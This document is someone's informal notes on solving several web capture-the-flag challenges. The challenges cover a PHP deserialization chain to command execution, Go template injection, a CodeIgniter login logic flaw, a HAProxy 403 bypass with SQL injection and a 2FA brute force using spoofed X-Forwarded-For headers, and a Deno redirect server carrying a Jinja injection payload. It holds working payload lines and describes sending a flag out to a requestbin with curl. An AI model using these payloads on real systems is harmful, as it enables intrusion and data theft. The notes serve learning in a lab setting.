work timesheet
claim hr modules if not by end of term

pop restaurant - php serilisation, pop chain and eventual rce
this was difficult! took 6-7 hours
first needed to figure out what i was looking for, which i wasn't sure
had experience with perl which is similar to php, but didn't know its intracacies
eventually, realised that there seemed to be some bunches of classes that didn't really do anything, and a lot of strange attributes lying around
from here, i started researching what some possibilities of php vulnerabilities were
found out that there was a serialisation vulnerability as well as a pop(!) vulnerability. with the name of the challenge coinciding with this, it seemed that i was on the right track
from here, started researching more into how pop chain vulnerabilty works, as well as serialisation
realised that serialisation basically allowed you to execute and take control of a class through 'magic methods'
looked through different magic methods of the repo to figure out what they did
researched the magic methods to see how they worked, and tried to see if there were any clues online as to which ones and how could be exploited
learned that 'pop chain' refers to the fact that multiple magic methods are often chained together
realised that our entrypoint was most likely in pizza with destruct. 
destruct calls an unknown property what on size, so if we set size to an object we could do something there
spaghetti has a get magic method, which is called when an unknown property is accessed, precisely what we needed
we set pizza->size to spaghetti instance
spaghetti then references its sauce attribute, which is called as a function.
initial thoughts here were to directly run an anonymous function that would run system, to give us rce
this does work as is, but unfortunately could not be serialised, had to look elsewhere
then saw the arrayhelpers class, in that it takes an array of values, and a callback, and runs the values against the callback.
we could combine this with the icecream class, which has an invoke magic method which is called when the class is called as a function, tying in with spaghetti sauce. spaghetti sauce can be set to ice cream, which would then get called
ice cream invoke loops through its flavours and echoes them, effectively calling them. we can set our arrayhelper to the ice cream flavour, which would then start having arrayhelper run the callbacks with its values.
we set arrayhelpers callback to be 'system', and now we have access to the server shell!
arrayhelpers can be instantiated with an array of strings, which would be our commands that we want to run.
first thoughts were to run 'ls /'
did a little bit of tinkering around locally to see what we could get
interestingly, i had little luck with getting this to work locally in the beginning. realised that i seemingly needed the wakeup magic method on pizza with a print to be able to get it to actually run my code. 
i had injected my payload as a base 64 encoded, serialised object, passed into the input of one of the order buttons.
eventually, i found that even without the wakeup method, my code was being executed, just not being shown. realising that the object was being deserialised on the order.php page, that was probably why. i then decided to check the networks tab for the responses to see if i could find anything on the orders.php page. going into the raw response - it was there!
so happily, i tried to put that in the real server. it didn't work - there was no response for some reason. i had injected the payload in a similar fashion, just changing the value of the hidden input field using inspect element, and then clicking order to submit the post request.
this stumped me for a little while as to why it didn't work (i never figured out why this didn't work).
eventually, i decided to take a different path - given that i had a literal shell all to myself - i could run whatever i wanted! so i decided to see if i could just get the flag, and send it to a requestbin (which is exactly what i did). by setting up a curl request to send to the request bin, i set the command to run to cd into the root directory, and ls the *flag.txt file (as from the docker_build) i could see that the name was randomly generated. we could then pipe that into xargs with the cat command to cat the flag within the file, and going to the pastebin - we got our flag (finally!)

renderquest ssti and rce
30 min
golang - something im familiar with
a few red herrings. thinking that mux.handle on static may serve the entire file directory, but this was handled by the parameters scoping it just to /static
readremotefile - but was also quickly shut down as handled by issubdirectory
the fetchserverinfo command looks interesting to start with, but then realised that (at least for the time being) couldn't do anything as all the calls were hard coded strings
ssti - http template is vulnerable, and we have free reign over supplying one
found https://blog.takemyhand.xyz/2020/06/ssti-breaking-gos-template-engine-to
spun up a free oracle server for file hosting and testing
to test some payloads to verify it was working, which it was
initially tried to use the 
`{{define "T1"}}ONE{{end}}{{template "T1"}}`
method to try running a js script
but then realised it would be even easier - the fetchservercommand is a receiver method of the reqdata struct
this would mean that the templating can easily access this method and actually run it
giving us free reign over the shell :)
we then can just {{FetchServerInfo "ls ../flag*.txt | xargs cat"}} and the rest is history

insomnia
30 min
php 
initially thought sql injection after finding authentication logic
tried some basic sqli injection to start, to no avail
had a look that this seemed to be a framework - known as codeigniter
looked up codeigniter vulnerabilities, thought it could lead to something, but it seemed like the version they were using (v4.4.4) didn't have anything significant
looked back at the code logic in the authentication and found that if you were logged in as 'administrator', you would be able to get the flag on the profile page 
checking login script - seemed like there was a logic error.
missing bracket on the !count(elements) == 2
this meant that !count(elements) would always return false, and false != 2, so that check for validating the input contains two fields was invalid
this would mean that without a password, the get user from the db would just return the user since there was no password to check against anyway
used firefox edit/resend request to send a req with just a username and no password field, with username as administrator
this gave me a 200 - which was promising, and a token
i then took this jwt token (took too much fiddling around, lol because i couldn't copy it for the life of me)
put the token to spoof my own cookie, and navigated to the profile page 

no threshold
6 hours
took quite a little while
firstly, was a flask app and in python - so i guess should be easier right
looking around the website, there was little else other than a login page and a shop page
i snooped around the shop page initially, but realised there was little that we could get there
snooping around the html files, it's pretty clear that the final flag is situated in the dashboard html, so that's probably where we want to get to
at first, based on what i had done in the previous few challenges - seeing render_template made me think ssti, but not long after i concluded that this likely wasn't it 
i noted a few more things
there was an obvious sql injection point
there was that login page that had some sort of 2fa verification
so initial thoughts was go to login > sql injection > and maybe brute force 2fa to get into the dashboard with admin credentials
this turned out a LOT harder than i thought
first of all, accessing the login page was not possible at first 
was being rejected with a 403
took me (admittedly a little too long) to figure out that this was being handled in the haproxy
from here, i looked around for haproxy vulnerabilities first. found some cves, but a little more research found that the haproxy version they were using had unfortunately patched most (if not all of) the critical cves. had to scrap that
i then looked around on google for how to bypass 403 that have been set by proxies. https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses
tried http method fuzzing - no avail
then i looked into path fuzzing
initially, the examples that were present on hacktricks did not give me any luck - it looked like either my browser or haproxy was validating and minimising the url
running a curl request, this also didn't work, so it seemed to be haproxy handling it
the path_beg gave me a hint that maybe by providing bits like ../ etc., then it wouldn't match and allow me access
this wasn't the case
then had a thought - what if i try and encode one of the characters in url encoding, like logi%63
this worked and got me in!
from here, i tried some common sql injection tricks since i already knew that there was that vulnerability from the start
eventually, username admin' or '1'='1 and filling in password with anything worked, altho needed to be careful and modify the request of the button to use the encoded login url, otherwise i would get redirected back to the haproxy 403. 
did take a little bit of fiddling, got there in the end and we got to the verify 2fa page
now, i thought this part would be quite easy, as trying out the inputs also allows 4 digits - so it's a 4 digit code that we are expecting (confirmed by the source code)
of course, we could probably try and get the code through the code somehow, but i figured that brute forcing might just be easier
so i wrote a quick script to start sending codes from 0000-9999. unfortunately, after 20 submissions - i got rate limited. i did notice these in the haproxy config earlier, but didn't pay it much mind (i should of)
noticed that this was just relying on the x-forwarded-for header, which the user had full control of - so maybe we could write a script that spoofs the x-forwarded-for with a new ip every time we try a new code, and brute force that way.
i wrote the script in go, with the entire login sequence so it's a one stop shop solution - and we have our flag!

doxpit
8 hours
Deno.serve((request: Request) => {
  console.log(
    "Request received: " +
      JSON.stringify({
        url: request.url,
        method: request.method,
        headers: Array.from(request.headers.entries()),
      })
  );
  // Head - 'Content-Type', 'text/x-component');
  if (request.method === "HEAD") {
    return new Response(null, {
      headers: {
        "Content-Type": "text/x-component",
      },
    });
  }
  // Get - redirect to example.com
  if (request.method === "GET") {
    return new Response(null, {
      status: 302,
      headers: {
        Location: "http://0.0.0.0:3000/home?token=476e41ef04c364349802afa96fba95e6&directory={%with a=((((request|attr('application'))|attr(request|attr(\"args\")|attr(\"get\")('globs')))|attr(request|attr(\"args\")|attr(\"get\")('item')))(request|attr(\"args\")|attr(\"get\")('builtins'))|attr(request|attr(\"args\")|attr(\"get\")('getitem')))(request|attr(\"args\")|attr(\"get\")('import'))('os')|attr('popen')(request|attr(\"args\")|attr(\"get\")('command'))|attr('read')()%}{%print(a)%}{%endwith%}&globs=__globals__&item=__getitem__&builtins=__builtins__&import=__import__&command=ls /flag* | xargs cat",
      },
    });
  }
});

